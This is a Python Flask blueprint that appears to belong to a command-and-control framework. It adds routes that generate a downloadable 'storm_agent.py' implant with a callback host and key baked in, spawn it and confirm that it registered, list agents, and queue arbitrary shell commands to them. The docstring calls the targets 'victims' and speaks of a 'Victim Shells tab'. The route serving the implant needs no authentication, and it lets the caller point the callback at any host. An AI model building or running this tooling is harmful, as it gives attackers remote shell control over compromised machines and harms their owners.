"""agent blueprint (P1.1) -- generate, spawn and verify a resident agent.

ADD-ONLY (NR-2): new ``/api/agent/*`` routes.

The agent speaks the existing ``/api/c2/*`` contract, so it needs no new victim
endpoints and lands in the existing Victim Shells tab.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import time

from flask import Blueprint, Response, jsonify, request, session

from app.exec import agent as agent_mod
from app.services import c2 as c2svc
from app.state import BASE_DIR

bp = Blueprint("agent", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


def _guard():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    return None


def _ingest_key() -> str:
    explicit = (request.args.get('k') or '').strip()
    if explicit:
        return explicit
    try:
        with open(os.path.join(BASE_DIR, 'Settings.json'), encoding='utf-8') as fh:
            return (json.load(fh).get('ingest_secret') or '').strip()
    except Exception:
        return ''


@bp.route('/api/agent/agent.py')
def api_agent_script():
    """The generated agent, with base + ingest key baked in.

    ``?k=`` overrides the key, ``?uid=`` pins an identity, ``?base=`` overrides
    the callback host (useful when the agent runs elsewhere), ``?download=1``
    sets an attachment filename.
    """
    base = request.args.get('base') or request.host_url.rstrip('/')
    clamp = int(request.args.get('clamp', 2000))
    body = agent_mod.agent_script(base, request.args.get('uid', ''), _ingest_key(), clamp)
    headers = {}
    if request.args.get('download'):
        headers['Content-Disposition'] = 'attachment; filename=storm_agent.py'
    return Response(body, mimetype='text/x-python', headers=headers)


@bp.route('/api/agent/commands')
def api_agent_commands():
    bad = _guard()
    if bad:
        return bad
    return jsonify({'magic_commands': agent_mod.MAGIC_COMMANDS,
                    'note': 'anything else runs through the shell'})


@bp.route('/api/agent/agents')
def api_agent_list():
    """Registered agents only (the JS C2 client has no ``kind`` marker)."""
    bad = _guard()
    if bad:
        return bad
    agents = [c for c in c2svc.list_clients()
              if (c.get('info') or {}).get('kind') == 'agent']
    return jsonify({'agents': agents, 'count': len(agents)})


@bp.route('/api/agent/spawn', methods=['POST'])
def api_agent_spawn():
    """Run the generated agent locally and PROVE it registered.

    This is the "does the agent actually work" button: it writes the script to a
    temp file, starts it, and polls for its registration rather than assuming.
    """
    bad = _guard()
    if bad:
        return bad
    data = request.json or {}
    uid = (data.get('uid') or 'spawn-%d' % int(time.time())).strip()
    base = data.get('base') or 'http://127.0.0.1:%s' % request.host.split(':')[-1]
    if ':' not in request.host:
        base = request.host_url.rstrip('/')
    wait = min(float(data.get('wait', 6)), 30)

    script = agent_mod.agent_script(base, uid, _ingest_key())
    path = os.path.join(tempfile.gettempdir(), 'storm_agent_%s.py' % uid.replace('/', '_'))
    with open(path, 'w', encoding='utf-8') as fh:
        fh.write(script)

    before = {c['uid'] for c in c2svc.list_clients()}
    proc = subprocess.Popen([sys.executable, path],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    registered = False
    deadline = time.time() + wait
    while time.time() < deadline:
        if uid in {c['uid'] for c in c2svc.list_clients()}:
            registered = True
            break
        if proc.poll() is not None:
            break
        time.sleep(0.25)

    if not registered or not data.get('keep'):
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            pass

    return jsonify({
        'status': 'ok' if registered else 'failed',
        'registered': registered,
        'uid': uid,
        'base': base,
        'script_path': path,
        'pid': proc.pid,
        'still_running': proc.poll() is None,
        'preexisting_agents': sorted(before),
        'note': 'pass {"keep": true} to leave the agent running',
    }), (200 if registered else 500)


@bp.route('/api/agent/exec', methods=['POST'])
def api_agent_exec():
    """Queue a command for a spawned agent and optionally wait for the output."""
    bad = _guard()
    if bad:
        return bad
    data = request.json or {}
    uid = (data.get('uid') or '').strip()
    command = (data.get('command') or '').strip()
    if not uid or not command:
        return jsonify({'error': 'uid and command required'}), 400
    c2svc.queue_command(uid, command)
    wait = min(float(data.get('wait', 5)), 30)
    deadline = time.time() + wait
    outputs = []
    while time.time() < deadline:
        outputs = c2svc.drain_responses(uid)
        if outputs:
            break
        time.sleep(0.25)
    return jsonify({'status': 'ok', 'uid': uid, 'queued': command,
                    'output': outputs[0]['output'] if outputs else None,
                    'timed_out': not outputs})
